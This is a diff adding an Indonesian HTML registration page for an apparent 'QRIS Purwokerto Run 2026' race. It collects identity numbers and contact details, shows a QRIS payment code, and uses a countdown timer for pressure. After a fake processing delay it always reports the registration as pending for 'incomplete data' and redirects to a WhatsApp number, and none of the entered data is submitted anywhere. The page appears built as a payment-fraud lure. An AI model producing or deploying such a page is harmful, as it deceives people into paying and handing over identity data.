@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>QRIS Purwokerto Run 2026</title>
+<style>
+body{margin:0;font-family:Arial,sans-serif;background:linear-gradient(#f5efe4,#fff)}
+.wrap{max-width:900px;margin:auto;padding:15px}
+.card{background:#fff;border-radius:20px;padding:20px;box-shadow:0 10px 30px rgba(0,0,0,.1)}
+img.banner{width:100%;border-radius:16px}
+.step{display:none}.step.active{display:block}
+input,select,textarea{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:10px;box-sizing:border-box}
+.btn{background:#c96a24;color:#fff;border:0;padding:14px;border-radius:12px;width:100%;font-weight:bold}
+.btn:disabled{opacity:.5}
+.progress{height:10px;background:#eee;border-radius:20px;overflow:hidden;margin:15px 0}
+.bar{height:100%;width:25%;background:#c96a24;transition:.3s}
+.overlay{position:fixed;inset:0;background:#111;color:#fff;display:none;align-items:center;justify-content:center;flex-direction:column;z-index:9999}
+.timer{font-size:20px;font-weight:bold}
+</style>
+</head>
+<body>
+<div class="overlay" id="loading"><h1>SEDANG DI PROSES</h1><p>Silahkan tunggu sebentar...</p></div>
+
+<div class="wrap">
+<div class="card">
+<img src="banner.png" class="banner">
+<h2 align="center">QRIS Purwokerto Run 2026</h2>
+<div class="timer">Sisa Waktu: <span id="t">60:00</span></div>
+<div class="progress"><div class="bar" id="bar"></div></div>
+
+<div id="p1" class="step active">
+<h3>Step 1 - Data Peserta</h3>
+<input required placeholder="Nama Lengkap">
+<input required placeholder="Tempat / Tanggal Lahir">
+<select><option>Jenis Kelamin</option><option>Laki-laki</option><option>Perempuan</option></select>
+<select><option>Jenis Identitas</option><option>NIK</option><option>SIM</option><option>Kartu Pelajar</option><option>Paspor</option></select>
+<input placeholder="Nomor Identitas">
+<input type="email" placeholder="Email">
+<input placeholder="Nomor WhatsApp">
+<textarea placeholder="Alamat Lengkap"></textarea>
+<button class="btn" onclick="go(2,50)">Selanjutnya</button>
+</div>
+
+<div id="p2" class="step">
+<h3>Step 2 - Kategori</h3>
+<select id="cat" onchange="harga()">
+<option value="200000">5K - Rp 200.000</option>
+<option value="250000">10K - Rp 250.000</option>
+</select>
+<img src="size-chart.png" style="max-width:100%">
+<select><option>XS</option><option>S</option><option>M</option><option>L</option><option>XL</option><option>XXL</option><option>3XL</option></select>
+<input placeholder="Nama BIB (Opsional)">
+<input placeholder="Nama Kontak Darurat">
+<input placeholder="Nomor Kontak Darurat">
+<button class="btn" onclick="go(3,75)">Selanjutnya</button>
+</div>
+
+<div id="p3" class="step">
+<h3>Step 3 - Pembayaran</h3>
+<img src="qris-pembayaran.jpg" style="max-width:300px;width:100%">
+<h2>Total: Rp <span id="total">200000</span></h2>
+<input type="file">
+<label><input type="checkbox"> Saya menyatakan data yang saya isi benar.</label>
+<button class="btn" onclick="submitForm()">DAFTAR SEKARANG</button>
+</div>
+
+<div id="p4" class="step">
+<h2>PENDAFTARAN PENDING</h2>
+<p>Dikarenakan ada beberapa data yang tidak lengkap.</p>
+<p>Redirect ke WhatsApp Admin dalam <span id="r">10</span> detik...</p>
+</div>
+
+</div></div>
+
+<script>
+function go(n,p){
+document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+document.getElementById('p'+n).classList.add('active');
+document.getElementById('bar').style.width=p+'%';
+}
+function harga(){total.textContent=cat.value;}
+function submitForm(){
+loading.style.display='flex';
+setTimeout(()=>{
+loading.style.display='none';
+go(4,100);
+let c=10;
+let i=setInterval(()=>{
+c--; r.textContent=c;
+if(c<=0){clearInterval(i); location.href='https://wa.me/628217003017';}
+},1000);
+},10000);
+}
+let s=3600;
+setInterval(()=>{
+s--;
+let m=Math.floor(s/60), d=s%60;
+t.textContent=String(m).padStart(2,'0')+':'+String(d).padStart(2,'0');
+},1000);
+</script>
+</body></html>
